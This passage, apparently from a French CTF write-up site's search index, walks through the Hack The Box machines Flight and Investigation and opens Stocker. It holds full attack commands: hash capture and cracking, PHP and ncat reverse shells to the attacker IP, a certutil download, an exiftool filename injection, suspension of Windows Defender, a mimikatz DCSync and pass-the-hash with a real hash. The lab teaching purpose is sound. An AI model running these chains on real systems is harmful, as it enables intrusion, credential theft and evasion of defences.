expliqu\u00e9 sur HackTricks</p> <ul> <li>On lance donc le responder sur l'interface VPN : <code>sudo responder -i tun0</code></li> <li>On cr\u00e9e donc un fichier <code>desktop.ini</code> contenant les \u00e9l\u00e9ments suivants :</li> </ul> <p>```text title=\"desktop.ini\" [.ShellClassInfo] IconFile=\\10.10.14.149\\blah IconIndex=1337</p> <pre><code>On upload ensuite ce fichier :\n\n- soit avec smbmap\n\n```shell title=\"upload du fichier\"\nsmbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP --upload desktop.ini Share/desktop.ini\n</code></pre> <ul> <li>Ou avec smbclient.py :</li> </ul> <pre><code>$ smbclient.py \"$AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP\"\nuse shared\nput desktop.ini\n</code></pre> <ul> <li>On attend quelques instants et on r\u00e9cup\u00e8re le hash d'un nouvel utilisateur : </li> <li>Que l'on s'empresse de casser avec la commande <code>john --wordlist=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.10.11.187.txt</code></li> </ul> <p>On r\u00e9cup\u00e8re ainsi un nouvel utilisateur :</p> Utilisateur Mot de passe <code>flight.htb\\c.bum</code> <code>Tikkycoll_431012284</code>"},{"location":"CTF%20-%20Challenges/htb/Flight/#enumeration-des-autorisations-de-cbum","title":"Enum\u00e9ration des autorisations de c.bum","text":"<p>On v\u00e9rifie si cet utilisateur dispose d'avantage de permissions sur les partages :</p> <pre><code>$ cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --shares | cut -c60- | grep -i WRITE\n      Shared          READ,WRITE      \n      Web             READ,WRITE  \n</code></pre> <p>On reconna\u00eet dans le partage Web une arborescence qui est en fait celle des 2 virtual hosts pr\u00e9c\u00e9demment \u00e9num\u00e9r\u00e9.</p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#obtention-dun-premier-shell","title":"Obtention d'un premier shell","text":"<p>L'acc\u00e8s \u00e0 ce partage \u00e9tant en \u00e9criture, on a (enfin) la possibilit\u00e9 d'obtenir un reverse shell</p> <p>On upload un reverse shell PHP puis on l'ex\u00e9cute :</p> <ul> <li>On lance un listener avec <code>rlwrap nc -lnvp 1337</code></li> <li>On edite le fichier pour configurer l'IP et le port de notre listener</li> <li>On l'upload : `smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP --upload revshell.php Web/school.flight.htb/rebrec1.php</li> <li>On ex\u00e9cute finalement le reverse shell : <code>curl -X GET http://$TARGET_IP/rebrec1.php -H \"Host: school.flight.htb\"</code></li> </ul> <p>On obtient ainsi un premier shell en tant qu'utilisateur <code>svc_apache</code></p> <p></p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#elevation-de-privileges-en-tant-que-cbum","title":"Elevation de privil\u00e8ges en tant que c.bum","text":"<p>On utilise ensuite l'outil <code>RunasCs.exe</code> pour ex\u00e9cuter un nouveau reverse shell en tant que <code>c.bum</code> :</p> <ul> <li>On lance un listener : <code>rlwrap nc -lnvp 1338</code></li> <li>On t\u00e9l\u00e9charger notre outil :</li> </ul> <p>```shell title=\"T\u00e9l\u00e9chargement d'un fichier \u00e0 l'aide de certutil\" certutil.exe -urlcache -split -f \"http://10.10.14.149:1234/RunasCS.exe\" RunasCS.exe certutil.exe -urlcache -split -f \"http://$($LHOST):$LPORTW_WIN_TOOLS/$File\" $Dest</p> <pre><code>- On ex\u00e9cute le reverse shell :\n</code></pre> <p>RunasCS.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.149:1338                                                                                                              </p> <pre><code>### Enum\u00e9ration locale\n\nOn constate la pr\u00e9sence du dossier `c:\\inetpub`, dossier caract\u00e9ristique de la pr\u00e9sence d'un serveur web IIS.\n\nCette fonctionnalit\u00e9 est toujours install\u00e9e :\n\n```powershell\nPS C:\\&gt; get-windowsfeature web-server | fl DisplayName, InstallState\n\nDisplayName  : Web Server (IIS)\nInstallState : Installed\n</code></pre> <p>Et le processus est en cours d'ex\u00e9cution :</p> <pre><code>PS C:\\xampp\\htdocs\\school.flight.htb&gt; Get-Process w3wp\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  \n-------  ------    -----      -----     ------     --  -- -----------                                                  \n    497      40    76040      63584              4360   0 w3wp              \n</code></pre> <p>Apr\u00e8s v\u00e9rification, on constate que <code>c.bum</code> dispose de droits en \u00e9criture sur le dossier \u00e0 l'aide de la commande <code>accesschk.exe -accepteula -w c:\\inetpub</code> (il faut au pr\u00e9alable l'uploader sur la machine)</p> <p></p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#elevation-de-privileges","title":"Elevation de privil\u00e8ges","text":""},{"location":"CTF%20-%20Challenges/htb/Flight/#upload-du-reverse-shell","title":"Upload du reverse shell","text":"<p>On upload donc un reverse shell dans le dossier <code>c:\\inetpub\\development</code>. Le reverse shell doit \u00eatre un fichier <code>.aspx</code>, on utilise celui-ci apr\u00e8s avoir modifier son ent\u00eate pour y configurer notre adresse IP et port sur lequel s'ex\u00e9cutera un nouveau listerner que l'on lance une fois de plus avec <code>rlwrap nc -lnvp 1339</code></p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#execution","title":"Ex\u00e9cution","text":"<p>Pour trouver sur quel port le service IIS est en \u00e9coute, nous utilisons la commande suivante :</p> <pre><code>PS &gt; Get-NetTCPConnection -State Listen | Select-Object -Property @{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}},LocalPort\n\nProcessName                           LocalPort\n-----------                           ---------\ndfsrs                                     49731\ndns                                       49694\nservices                                  49682\nlsass                                     49674\nlsass                                     49673\nlsass                                     49667\nsvchost                                   49666\nsvchost                                   49665\nwininit                                   49664\nSystem                                    47001\nMicrosoft.ActiveDirectory.WebServices      9389\nSystem                                     8000\nSystem                                     5985\nlsass                                      3269\nlsass                                      3268\nlsass                                       636\nsvchost                                     593\nlsass                                       464\nSystem                                      445\nhttpd                                       443\nlsass                                       389\nsvchost                                     135\nlsass                                        88\nhttpd                                        80\ndns                                          53\ndns                                          53\ndns                                          53\ndns                                          53\ndfsrs                                     49731\ndns                                       49694\nservices                                  49682\nlsass                                     49674\nlsass                                     49673\nlsass                                     49667\nsvchost                                   49666\nsvchost                                   49665\nwininit                                   49664\nMicrosoft.ActiveDirectory.WebServices      9389\nlsass                                      3269\nlsass                                      3268\nlsass                                       636\nsvchost                                     593\nhttpd                                       443\nlsass                                       389\nSystem                                      139\nsvchost                                     135\nhttpd                                        80\ndns                                          53\ndns                                          53\n</code></pre> <p>Le r\u00e9sultat obtenu ne nous permet pas directement d'identifier le ports en \u00e9coute car cette commande n'affiche pas le nom des processus de privil\u00e8ges plus \u00e9lev\u00e9s.</p> <p>Ainsi, un certain nombre de lignes ont pour nom de processus <code>System</code> au lieu du processus r\u00e9el (<code>w3wp</code> dans notre cas).</p> <p>Apr\u00e8s \u00e9limination des processus autre que <code>System</code>, nous obtenons la liste de ports potentiels suivante :</p> <pre><code>PS &gt; Get-NetTCPConnection -State Listen | Select-Object -Property @{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}},LocalPort | ? {$_.ProcessName -eq 'system'}\n\nProcessName LocalPort\n----------- ---------\nSystem          47001   ?\nSystem           8000   ?\nSystem           5985   ?\nSystem            445   &lt;== microsoft-ds\nSystem            139   &lt;== netbios-ssn\n</code></pre> <p>Il nous reste donc 3 ports \u00e0 tester.</p> <p>Nous utilisons depuis notre shell le CmdLet powershell <code>Invoke-WebRequest</code> :</p> <pre><code>PS C:\\rebrec&gt; iwr http://127.0.0.1:8000 -outfile a.html -v\nVERBOSE: GET http://127.0.0.1:8000/ with 0-byte payload\nVERBOSE: received 45949-byte response of content type text/html\n</code></pre> <p>Les autres ports test\u00e9s ne retournaient pas de donn\u00e9es. Nous savons donc que le service s'ex\u00e9cute tr\u00e8s probablement sur le port 8000</p> <p>Le reverse shell <code>.aspx</code> copi\u00e9 dans le dossier <code>c:\\inetpub\\development</code>, nous l'ex\u00e9cutons via la commande powershell :</p> <pre><code>PS C:\\rebrec&gt; iwr http://127.0.0.1:8000/revshell.aspx -outfile a.html\n</code></pre> <p>et obtenons un shell en tant que :</p> <pre><code>c:\\windows\\system32\\inetsrv&gt; whoami\niis apppool\\defaultapppool\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Flight/#escalade-de-privileges-vers-system","title":"Escalade de privil\u00e8ges vers System","text":"<p>Nous d\u00e9couvrons rapidement que le compte <code>iis apppool\\defaultapppool</code> dispose du privil\u00e8ges <code>SeImpersonatePrivilege</code>, n\u00e9cessaire \u00e0 l'exploitation des vuln\u00e9rabilit\u00e9s de la famile des \"Potato\" (RoguePotato, etc.)</p> <p>Apr\u00e8s une br\u00e8ve lecture sur ce type d'attaques sur cette page d'hacktricks, on t\u00e9l\u00e9chargerSharpEfsPotato, qui, une fois compil\u00e9 avec visual studio, puis upload\u00e9 sur notre cible nous permet de lancer un dernier reverse shell en tant que <code>SYSTEM</code></p> <p>Pour ce faire, on uploadera l'utilitaire <code>ncat.exe</code> et on ex\u00e9cutera :</p> <pre><code>SharpEfsPotato.exe -p ncat.exe -a \"10.10.14.149 1500 -e cmd.exe\"\nSharpEfsPotato by @bugch3ck\n  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n\n  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/0e8462f4-fa42-4fbe-9dcf-eefc70c83679/\\0e8462f4-fa42-4fbe-9dcf-eefc70c83679\\0e8462f4-fa42-4fbe-9dcf-eefc70c83679\ndf1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:\n[x]RpcBindingSetAuthInfo failed with status 0x6d3\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n</code></pre> <p>```shell title=\"reverse shell en tant que SYSTEM\"</p> <p>C:\\Windows\\system32&gt;whoami whoami nt authority\\system</p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#on-recupere-le-flag-avec-la-commande","title":"On r\u00e9cup\u00e8re le flag avec la commande","text":"<p>type c:\\users\\administrator\\desktop\\root.txt</p> <pre><code>## Bonus : compromission totale de l'Active Directory\n\nPour le plaisir, et dans l'optique de simuler une action de persistance sur l'active directory, on va maintenant r\u00e9cup\u00e9rer la base NTDS.DIT (base de donn\u00e9e contenant les hashes de tous les comptes utilisateurs de l'active directory).\n\nNous utiliserons l'outil le plus connu \u00e0 savoir, l'incontournable `Mimikatz`.\n\nCet outil \u00e9tait d\u00e9tect\u00e9 par tous les antivirus qui se respecte, nous v\u00e9rifions tout d'abord si un Anti Virus s'ex\u00e9cute sur la machine en affichant la liste des processus s'ex\u00e9cutant sur la machine :\n\n```powershell\nPS &gt; get-process | Select Name | sort \n#[...]\nMsMpEng\n#[...]\n</code></pre> <p>On reconna\u00eet le processus <code>MsMpEng</code> qui est le module anti malware de Windows Defender.</p> <p>On le d\u00e9sactive en suspendant ce processus :</p> <pre><code># on d\u00e9pose sur la machine pssuspend.exe depuis live.sysinternals.com\n\nPS &gt; ./pssuspend.exe -accepteula MsMpEng\n\nPsSuspend v1.07 - Process Suspender\nCopyright (C) 2001-2016 Mark Russinovich\nSysinternals\n\nProcess MsMpEng suspended.\n</code></pre> <p>On peut maintenant agir sans risquer de se faire d\u00e9tecter par Windows Defender :</p> <ul> <li>On upload <code>Mimikatz.exe</code></li> <li>On ex\u00e9cute ensuite : <code>mimikatz.exe \"lsadump::dcsync /domain:flight.htb /all /csv\"</code> </li> </ul>"},{"location":"CTF%20-%20Challenges/htb/Flight/#verification-des-acces","title":"V\u00e9rification des acc\u00e8s","text":"<p>Grace \u00e0 ces hashes collect\u00e9s, nous pourrons nous reconnecter via l'attaque Pass The Hash \u00e0 distance \u00e0 la machine en tant qu'administrateur du domaine, sans disposer du mot de passe de cet utilisateur :</p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#acces-distant","title":"Acc\u00e8s distant","text":"<p>=== \"wmiexec.py\"</p> <pre><code>```shell title=\"Utilisation du Hash NT r\u00e9cup\u00e9r\u00e9 avec wmiexec.py\"\n\n$ wmiexec.py  -hashes :43bbfc530bab76141b12c8446e30c17c -dc-ip $TARGET_IP flight.htb/Administrator@$TARGET_IP whoami\n\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n\n[*] SMBv3.0 dialect used\nflight\\administrator\n```\n</code></pre> <p>=== \"psexec.py\"</p> <pre><code>```shell title=\"Utilisation du Hash NT r\u00e9cup\u00e9r\u00e9 avec psexec.py\"\n\n$ psexec.py Administrator@$TARGET_IP -hashes :43bbfc530bab76141b12c8446e30c17c\n\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n\n[*] Requesting shares on 10.10.11.187.....\n[*] Found writable share ADMIN$\n[*] Uploading file BVTQqKla.exe\n[*] Opening SVCManager on 10.10.11.187.....\n[*] Creating service gxjC on 10.10.11.187.....\n[*] Starting service gxjC.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n```\n</code></pre> <p>=== \"crackmapexec.py\"</p> <pre><code>```shell title=\"Utilisation du Hash NT r\u00e9cup\u00e9r\u00e9 avec crackmapexec\"\n\n\u2514\u2500$ cme smb $TARGET_IP -u Administrator -H 43bbfc530bab76141b12c8446e30c17c --shares | cut -c60-\n\n      [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\n\n      [+] flight.htb\\Administrator:43bbfc530bab76141b12c8446e30c17c (Pwn3d!)\n\n      [+] Enumerated shares\n\n      Share           Permissions     Remark\n\n      -----           -----------     ------\n\n      ADMIN$          READ,WRITE      Remote Admin\n\n      C$              READ,WRITE      Default share\n\n      IPC$            READ            Remote IPC\n\n      NETLOGON        READ,WRITE      Logon server share\n\n      Shared          READ            \n      SYSVOL          READ            Logon server share\n\n      Users           READ            \n      Web             READ            \n```\n</code></pre> <p>Le gros int\u00e9r\u00eat de la r\u00e9cup\u00e9ration des Hash r\u00e9side dans le fait que l'on ne modifie pas le mot de passe du compte. L'utilisateur peut donc ne pas se rendre compte que son compte est compromis.</p> <p>Cette acc\u00e8s restera fonctionnel tout pendant que le mot de passe de cet utilisateur ne sera pas modifi\u00e9 (et donc son hash).</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/","title":"Investigation","text":""},{"location":"CTF%20-%20Challenges/htb/Investigation/#resume","title":"R\u00e9sum\u00e9","text":"<p>Cette machine Linux expose un service d'analyse de photo utilisant une version d'exiftools vuln\u00e9rable \u00e0 une \u00e9x\u00e9cution de code arbitraire \u00e0 distance (RCE). Apr\u00e8s l'obtention d'un shell sur la machine, une analyse d'un log de l'observateur d'\u00e9v\u00e8nement Windows r\u00e9v\u00e8le le mot de passe (suite \u00e0 une erreur de saisie) d'un utilisateur de la machine nous permettant d'\u00e9lever nos privil\u00e8ges \u00e0 ceux de l'utilisateur local. L'obtention des privil\u00e8ges root est ensuite r\u00e9alis\u00e9 en exploitant un binaire autoris\u00e9s \u00e0 s'ex\u00e9cuter en tant que super utilisateur \u00e0 l'aide de la commande sudo.</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#collecte-dinformation-generale","title":"Collecte d'information g\u00e9n\u00e9rale","text":"<p>Enum\u00e9ration 22/tcp   open  ssh 80/tcp   open  http</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#port-80","title":"Port 80","text":""},{"location":"CTF%20-%20Challenges/htb/Investigation/#information-generales","title":"Information g\u00e9n\u00e9rales","text":"<p>Nous d\u00e9couvrons : - un serveur apache en version 2.4.41 (Ubuntu) - un nom de domaine : eforenzics.htb</p> <pre><code>\u2514\u2500$ curl -s $TARGET_IP -v 1&gt;/dev/null\n*   Trying 10.10.11.197:80...\n* Connected to 10.10.11.197 (10.10.11.197) port 80 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: 10.10.11.197\n&gt; User-Agent: curl/7.87.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 301 Moved Permanently\n&lt; Date: Sat, 25 Feb 2023 14:06:22 GMT\n&lt; Server: Apache/2.4.41 (Ubuntu)\n&lt; Location: http://eforenzics.htb/\n</code></pre> <p>Le nom de domaine rajout\u00e9 dans le fichier <code>/etc/hosts</code>, nous d\u00e9couvrons un site web avec une seule fonctionnalit\u00e9 :  - Une page permettant d'uploader un fichier de type image</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#mode-de-fonctionnement-du-service-dupload-de-fichiers","title":"Mode de fonctionnement du service d'upload de fichiers","text":"<p>La page http://eforenzics.htb/service.html propose un formulaire d'envoie de fichiers.</p> <p></p> <p>Apr\u00e8s avoir envoy\u00e9 un fichier image, un lien temporaire nous est propos\u00e9 : </p> <p>La page g\u00e9n\u00e9r\u00e9e correspond \u00e0 la sortie standard de l'outil <code>exiftool</code> </p> <p>Les donn\u00e9es g\u00e9n\u00e9r\u00e9es nous permettent de d\u00e9couvrir la version de l'outil : 12.37</p> <p>On d\u00e9couvre ici que les versions inf\u00e9rieures \u00e0 la 12.38 sont vuln\u00e9rable \u00e0 une ex\u00e9cution de code.</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#exploitation","title":"Exploitation","text":"<p>Pour l'exploiter, la documentation nous explique qu'il suffit de fournir un nom de fichier se terminant par le symbole \"pipe\" (\"|\"). Si un fichier nomm\u00e9 ainsi est pass\u00e9 en param\u00e8tre d'exif tool, l'outil tente d'ex\u00e9cuter la commande pr\u00e9c\u00e9dent le pipe.</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#verification","title":"V\u00e9rification","text":"<p>On commence par v\u00e9rifier qu'il nous possible d'exploiter cette vuln\u00e9rabilit\u00e9 : - on lance un tcpdump avec un filtre n'affichant que le traffic icmp dans une fen\u00eatre avec la commande <code>sudo tcpdump -i tun0 icmp</code> - on tente l'ex\u00e9cution au travers de BURP de la commande ping vers notre ip en fournissant le nom de fichier <code>ping &lt;IP_DU_VPN&gt; |</code> </p> <p>On constate bien la r\u00e9ception de nos paquets ICMP : la RCE fonctionne donc correctement ! </p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#obtention-dun-reverse-shell","title":"Obtention d'un reverse shell","text":"<p>Les reverse shell classiques ne fonctionnent pas correctement : cela est d\u00fb au fait que la charge utile (payload) que l'on souhaite ex\u00e9cuter doit repr\u00e9senter un nom de fichier valide. Il n'est donc par exemple, pas possible : - d'utiliser le symbole <code>/</code> - chainer des commandes \u00e0 l'aide du <code>|</code> car le code vuln\u00e9rable dans exiftool extrait seulement la commande pr\u00e9sente au niveau du pire le plus \u00e0 droite (le d\u00e9but de la commande est donc ignor\u00e9) - d'envoyer une payload de plus de 255 caract\u00e8res - d'envoyer une payload contenant un guillemet (le parser du serveur HTTP traitant la requ\u00eate POST utilise ce symbole pour identifier la valeur du param\u00e8tre <code>filename=\"&lt;notre payload ici&gt;\"</code>)</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#decouverte-de-lenvironnement-serveur","title":"D\u00e9couverte de l'environnement serveur","text":"<p>On constate la pr\u00e9sence de python 3 \u00e0 l'aide de la commande <code>python3 -m http.server 65128</code>  qui nous permet de d\u00e9couvrir que chaque nouvelle commande est cr\u00e9\u00e9e dans un dossier diff\u00e9rent.</p> <p>La commande <code>python3 -m http.server 65128 -d ..</code> nous permet de voir dans notre navigateur le dossier parent.  La commande <code>php -S 0.0.0.0:65128 -t ..</code> nous permet un serveur php avec pour dossier racine le dossier parent (le m\u00eame que celui expos\u00e9 maintenant par notre serveur python)</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#execution-de-code-php","title":"Ex\u00e9cution de code php","text":""},{"location":"CTF%20-%20Challenges/htb/Investigation/#envoie-dun-reverse-shell-sur-le-serveur","title":"Envoie d'un reverse shell sur le serveur","text":"<p>On upload maintenant une image contenant du code php dans la balise de commentaire. Cette image \u00e9tant valide, elle est t\u00e9l\u00e9charg\u00e9e et stock\u00e9e dans un dossier \u00e0 usage unique du serveur.</p> <p>Nous g\u00e9n\u00e9rons l'image contenant un reverse shell php \u00e0 l'aide de la commande suivante :</p> <pre><code># on cr\u00e9e une image blanche\nconvert -size 32x32 xc:white img.php # on doit mettre l'extension php pour que le serveur php ne consid\u00e8re pas ce fichier comme une image\n\n# on y ajoute notre payload\nexiftool -Comment='&lt;?php  $sock=fsockopen(\"10.10.14.42\",1337);$proc=proc_open(\"/bin/sh\", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);   ?&gt;' img.php\n\n# On v\u00e9rifie la pr\u00e9sence du code PHP\nexiftool img.php | grep -i comment\n</code></pre> <p>On r\u00e9cup\u00e8re le nom du dossier temporaire qui contient notre image \u00e0 l'aide du serveur python qui nous offre la possibilit\u00e9 de parcourir chaque dossier temporaire g\u00e9n\u00e9r\u00e9. </p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#execution-du-reverse-shell","title":"Ex\u00e9cution du reverse shell","text":"<p>On lance un listener netcat : <code>nc -nlvp 1337</code> On acc\u00e8de ensuite \u00e0 notre image depuis le serveur PHP : </p> <p>Le reverse shell fonctionne :</p> <pre><code>id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#elevation-de-privileges","title":"El\u00e9vation de privil\u00e8ges","text":""},{"location":"CTF%20-%20Challenges/htb/Investigation/#collecte-dinformations","title":"Collecte d'informations","text":""},{"location":"CTF%20-%20Challenges/htb/Investigation/#compte-utilisateur-local","title":"Compte utilisateur local","text":"<p>Le fichier /etc/passwd contient le nom de l'utilisateur <code>smorton</code></p> <pre><code># passwd\nsmorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#dossier-interessant","title":"Dossier int\u00e9ressant","text":"<p><code>crontab -l</code> nous r\u00e9v\u00e8le l'existence d'un dossier <code>/usr/local/investigation/analysed_log</code></p> <pre><code>*/5 * * * * date &gt;&gt; /usr/local/investigation/analysed_log &amp;&amp; echo \"Clearing folders\" &gt;&gt; /usr/local/investigation/analysed_log &amp;&amp; rm -r /var/www/uploads/* &amp;&amp; rm /var/www/html/analysed_images/*\n</code></pre> <p>Ce  dossier <code>/usr/local/investigation/</code> contient un email contenu dans le fichier <code>Windows Event Logs for Analysis.msg</code></p> <p>On r\u00e9cup\u00e8re le contenu de ce mail \u00e0 l'aide de l'utilitaire \"extract-msg\"</p> <pre><code>pip install extract-msg \nextract-msg  Windows%20Event%20Logs%20for%20Analysis.msg\ncd 2022-01-16_0030\\ Windows\\ Event\\ Logs\\ for\\ Analysis    \n</code></pre> <p>Le corps du message nous sugg\u00e8re d'aller v\u00e9rifier dans le fichier d''\u00e9v\u00e8nement si il n'y a pas des informations qui ont fuit\u00e9.</p> <pre><code>\u2514\u2500$ cat message.txt                                        \nFrom: Thomas Jones &lt;thomas.jones@eforenzics.htb&gt;\nSent: Sun, 16 Jan 2022 00:30:29 +0000\nTo: Steve Morton &lt;steve.morton@eforenzics.htb&gt;\nSubject: Windows Event Logs for Analysis\n-----------------\n\nHi Steve,\n\nCan you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures. \n\nRegards.\nTom\n</code></pre> <p>En cherchant des \u00e9v\u00e8nements Windows 4625 (Authentication failed) on tombe sur ce qui ressemble \u00e0 un mot de passe saisit dans le champs utilisateur. L'audit de succ\u00e8s pr\u00e9sent juste apr\u00e8s cette \u00e9v\u00e8nement est une connexion de l'utilisateur <code>smorton</code> Il semble donc que cet utilisateur ait saisit son mot de passe dans la case \"mot de passe\" (ce qui a g\u00e9n\u00e9r\u00e9 un audit d'echec) puis s'est authentifi\u00e9 correctement juste apr\u00e8s. </p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#exploitation_1","title":"Exploitation","text":"<p>On essaie et r\u00e9ussi \u00e0 s'authentifier localement en tant qu'utilisateur <code>smorton</code> \u00e0 l'aide du mot de passe <code>Def@ultf0r3nz!csPa$$</code> via la commande <code>su - smorton</code></p> <p>On r\u00e9cup\u00e8re ensuite le flag utilisateur</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#obtention-des-privileges-root","title":"Obtention des privil\u00e8ges root","text":"<p>L'utilisateur <code>smorton</code> a le droit d'ex\u00e9cuter la commande <code>sudo</code> pour ex\u00e9cuter un fichier <code>/usr/bin/binary</code></p> <pre><code>smorton@investigation:/tmp/reb$ sudo -l\nMatching Defaults entries for smorton on investigation:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser smorton may run the following commands on investigation:\n    (root) NOPASSWD: /usr/bin/binary\n</code></pre> <p>L'exploitation de ce fichier nous permettrait d'obtenir les privil\u00e8ges root.</p>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#analyse-du-fonctionnement-du-fichier","title":"Analyse du fonctionnement du fichier","text":"<p>On r\u00e9cup\u00e8re le fichier sur notre machine et on le d\u00e9compile avec ghydra</p> <p>Son comportement est relativement simple : - il recoit 2 param\u00e8tres : une URL et un nom de fichier - le nom de fichier doit \u00eatre \"lDnxUysaQn\" - il enregistre le contenu de l'URL dans le nom de fichier  - enfin il ex\u00e9cute ce fichier avec perl</p> <p>Voici le code d\u00e9compil\u00e9 et annot\u00e9 que nous obtenons :</p> <pre><code>[...]\n  isGoodName = strcmp(*(char **)(argv + 0x10),\"lDnxUysaQn\");\n  if (isGoodName != 0) {   // \"si le param\u00e8tre le vaut pas 'lDnxUysaQn' on quitte\"\n    puts(\"Exiting... \");\n                    /* WARNING: Subroutine does not return */\n    exit(0);\n  }\n  puts(\"Running... \");\n  puts(\"Running... \");\n  fStream = fopen(*(char **)(argv + 0x10),\"wb\"); // on ouvre le fichier lDnxUysaQn en \u00e9criture\n  curlHandle = curl_easy_init();\n  curl_easy_setopt(curlHandle,0x2712,*(undefined8 *)(argv + 8)); // on param\u00e8tre l'URL de connexion\n  curl_easy_setopt(curlHandle,0x2711,fStream); // on indique qu'on va \u00e9crire dans ce fichier \n  curl_easy_setopt(curlHandle,0x2d,1);          // ?\n  isGoodName = curl_easy_perform(curlHandle);  // t\u00e9l\u00e9chargement\n  if (isGoodName == 0) {\n    isGoodName = snprintf((char *)0x0, 0, \"%s\", *(undefined8 *)(argv + 0x10));\n    datadatadata = (char *)malloc((long)isGoodName + 1);\n    snprintf(datadatadata, (long)isGoodName + 1, \"%s\", *(undefined8 *)(argv + 0x10));\n    isGoodName = snprintf((char *)0x0, 0, \"perl ./%s\", datadatadata); // on d\u00e9termine la longueur de la chaine perl + nom du fichier\n    __s = (char *)malloc((long)isGoodName + 1); // on alloue un espace m\u00e9moire de cette taille\n    snprintf(__s,(long)isGoodName + 1,\"perl ./%s\",datadatadata); // on pr\u00e9pare la commande \n    fclose(fStream);\n    curl_easy_cleanup(curlHandle);\n    setuid(0);\n    system(__s); // execution de la commande\n    system(\"rm -f ./lDnxUysaQn\");\n    return 0;\n[...]\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#exploitation_2","title":"Exploitation","text":"<p>On va donc : - cr\u00e9er un fichier perl affichant le flag de l'utilisateur root. - h\u00e9berger ce fichier sur un serveur web local - ex\u00e9cuter <code>sudo binary &lt;URL VERS NOTRE SCRIPT PERL&gt; lDnxUysaQn</code></p> <p>On cr\u00e9e un fichier perl qui affiche le flag :</p> <pre><code>use strict;\nuse warnings;\n\nmy $output = `cat /root/root.txt`;\nprint $output;\n</code></pre> <p>On affiche enfin le flag avec la commande</p> <pre><code>smorton@investigation:/tmp/reb$ sudo binary http://10.10.14.42:3333/get_root_flag.txt lDnxUysaQn\n\nRunning... \nFLAG_HERE\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Investigation/#le-mot-de-la-fin","title":"Le mot de la fin","text":"<p>Ce challenge a \u00e9t\u00e9 tr\u00e8s instructif : j'ai rencontr\u00e9 quelques difficult\u00e9s qui m'ont permis de m'am\u00e9liorer. J'ai notamment pris note que les reverse shell php \u00e9taient parfois capricieux... Celui qui semble le mieux fonctionner depuis quelques challenges s'appuie sur l'utilisation de la m\u00e9thode <code>shell_exec</code>. Je le tenterais donc en premier la prochaine fois.</p> <p>Je ne ma\u00eetrisais pas non plus l'ex\u00e9cution des serveur web python et php depuis un dossier diff\u00e9rent du dossier courant : c'est maintenant chose faite !</p> <p>Enfin, je ne connaissais pas d'outils permettant la lecture d'un fichier .msg depuis linux. J'ai maintenant ajout\u00e9 \u00e0 ma liste d'outil l'utilitaire python<code>extract-msg</code>.</p> <p>Ce challenge \u00e9tant class\u00e9 medium : je confirme qu'il n'est pas sp\u00e9cialement \"difficile\", la phase d'\u00e9num\u00e9ration est simplement un peu longue \u00e0 cause du fait que, pour une fois, le fait d'avoir en sa possession une RCE, ne permet pas directement d'obtenir un shell.</p> <p>Merci Hack The Box !</p>"},{"location":"CTF%20-%20Challenges/htb/Stocker/","title":"Stocker","text":"<p>![[Stocker-1.png]]</p> <pre><code>\u2514\u2500# gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain\n===============================================================\nGobuster v3.4\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             